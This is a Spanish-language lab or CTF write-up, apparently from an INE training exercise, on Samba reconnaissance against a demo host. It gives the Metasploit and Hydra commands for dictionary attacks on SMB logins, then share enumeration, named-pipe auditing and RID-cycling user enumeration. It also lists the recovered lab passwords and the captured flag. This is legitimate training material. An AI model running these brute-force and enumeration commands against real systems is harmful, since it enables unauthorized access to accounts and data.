# 📚 Samba Recon: Ataque de Diccionario

## 🔐 Fuerza bruta de credenciales

Para descubrir contraseñas de usuarios de Samba se emplean ataques de diccionario con Metasploit y Hydra.  
Las listas de palabras utilizadas son `/usr/share/wordlists/metasploit/unix_passwords.txt` y `/usr/share/wordlists/rockyou.txt`.

### 🧩 Usuario `jane` (módulo `smb_login`)

```bash
msfconsole -q
use auxiliary/scanner/smb/smb_login
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
set SMBUser jane
set RHOSTS demo.ine.local
exploit
```

| Parámetro       | Valor |
|-----------------|-------|
| **Contraseña**   | `abc123` |

### 👤 Usuario `admin` (Hydra con rockyou)

```bash
gzip -d /usr/share/wordlists/rockyou.txt.gz
hydra -l admin -P /usr/share/wordlists/rockyou.txt demo.ine.local smb
```

| Parámetro       | Valor |
|-----------------|-------|
| **Contraseña**   | `password1` |

---

## 📂 Enumeración de recursos compartidos

### 🔎 Recursos accesibles con `smbmap`

```bash
smbmap -H demo.ine.local -u admin -p password1
```

Se observa que el recurso **Nancy** es de solo lectura.

### 🚫 Verificación de la compartición `jane`

```bash
smbclient -L demo.ine.local -U jane
```
Contraseña: `abc123`

El recurso **jane** no aparece en la lista pública. Sin embargo, existe y se intenta acceder:

```bash
smbclient //demo.ine.local/jane -U jane
```

**Resultado:** La compartición existe pero **no se puede navegar** (acceso denegado).

---

## 🏁 Obtención de bandera desde el recurso `admin`

```bash
smbclient //demo.ine.local/admin -U admin
```

Dentro de la sesión SMB:
```
smb: \> ls
  .                                   D        0  ...
  ..                                  D        0  ...
  hidden                              D        0  ...
smb: \> cd hidden
smb: \hidden\> ls
  flag.tar.gz                         A        ...
smb: \hidden\> get flag.tar.gz
smb: \hidden\> exit
```

Extracción y lectura de la bandera:

```bash
tar -xf flag.tar.gz
cat flag
```

**Bandera:** `2727069bc058053bd561ce372721c92e`

---

## 🔧 Enumeración de pipes con nombre (Named Pipes)

Usando las credenciales `admin:password1`:

```bash
msfconsole -q
use auxiliary/scanner/smb/pipe_auditor
set SMBUser admin
set SMBPass password1
set RHOSTS demo.ine.local
exploit
```

**Resultado:** tuberías descubiertas  
`netlogon, lsarpc, samr, eventlog, InitShutdown, ntsvcs, srvsvc, wkssvc`

---

## 🆔 Enumeración de usuarios Unix mediante ciclos RID

```bash
enum4linux -r -u "admin" -p "password1" demo.ine.local
```

Se obtienen los SID de los usuarios:

| Usuario   | SID |
|-----------|-----|
| shawn     | S-1-22-1-1000 |
| jane      | S-1-22-1-1001 |
| nancy     | S-1-22-1-1002 |
| admin     | S-1-22-1-1003 |
